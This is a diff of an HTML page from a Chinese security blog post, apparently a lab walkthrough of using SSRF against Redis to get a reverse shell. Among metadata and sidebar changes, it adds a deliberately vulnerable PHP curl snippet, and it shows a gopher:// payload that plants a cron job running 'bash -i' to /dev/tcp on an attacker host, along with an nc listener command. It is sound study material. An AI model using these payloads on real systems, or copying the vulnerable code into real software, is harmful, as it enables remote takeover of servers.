@@ -116,7 +116,7 @@
 <meta property="og:site_name" content="cws6">
 <meta property="og:description" content="搭个环境怪不容易的，求大佬们放过。。。  参考文献：https://joychou.org/web/phpssrf.htmlhttps://www.anquanke.com/post/id/146417 SSRF概念SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 利用 SSRF 实现的攻击： 对外">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-12-03T13:42:34.618Z">
+<meta property="og:updated_time" content="2019-06-12T09:39:31.027Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSRF在Redis中反弹shell">
 <meta name="twitter:description" content="搭个环境怪不容易的，求大佬们放过。。。  参考文献：https://joychou.org/web/phpssrf.htmlhttps://www.anquanke.com/post/id/146417 SSRF概念SSRF（Server-Side Request Forgery），服务端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。 利用 SSRF 实现的攻击： 对外">
@@ -382,7 +382,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-03 21:42:34" itemprop="dateModified" datetime="2018-12-03T21:42:34+08:00">2018-12-03</time>
+                <time title="Modified: 2019-06-12 17:39:31" itemprop="dateModified" datetime="2019-06-12T17:39:31+08:00">2019-06-12</time>
               
             
           </span>
@@ -432,6 +432,8 @@
 <li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
 <li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
 </ul>
+<p><strong>一个栗子</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $location=$_GET[&apos;path&apos;]; </span><br><span class="line">    $curl = curl_init();</span><br><span class="line">    curl_setopt ($curl, CURLOPT_URL, $location);</span><br><span class="line">    curl_exec ($curl); </span><br><span class="line">    curl_close ($curl);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p><strong>环境</strong></p>
 <blockquote>
 <p>centos xx.xxx.xx.xxx ，目标（需以root方式启动redis）<br>ubuntu xxx.xx.xxx.xx，攻击方</p>
@@ -452,6 +454,7 @@
 <p><strong>执行此命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://xx.xxx.xx.xxx</span><br><span class="line">:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xx/8989 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a&apos;</span><br></pre></td></tr></table></figure></p>
 <p>出现5个ok，则成功了。</p>
 <p><strong>本地监听8989端口</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 8989</span><br></pre></td></tr></table></figure></p>
+<p><em>PS：当用<code>get</code> 方式的时候需将payload进行<code>url编码</code></em></p>
 <h4 id="可能出现的问题："><a href="#可能出现的问题：" class="headerlink" title="可能出现的问题："></a>可能出现的问题：</h4><p>①(error) MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.<br>原因：强制把redis快照关闭了导致不能持久化<br>解决方法：127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no</p>
 <p>②.save Error<br>日志（vi /var/log/redis/redis-server.log）：Failed opening .rdb for saving: Read-only file system<br> emmm，找不到解决办法，有大佬知道的话请给我说下。</p>
 
@@ -581,7 +584,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">88</span>
+                    <span class="site-state-item-count">93</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -653,6 +656,10 @@
                 
                   <li class="links-of-blogroll-item">
                     <a href="https://www.cnblogs.com/xiaoqiyue/" title="https://www.cnblogs.com/xiaoqiyue/" rel="noopener" target="_blank">爪爪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/bmjoker" title="https://www.cnblogs.com/bmjoker" rel="noopener" target="_blank">bmjoker</a>
                   </li>
                 
               </ul>
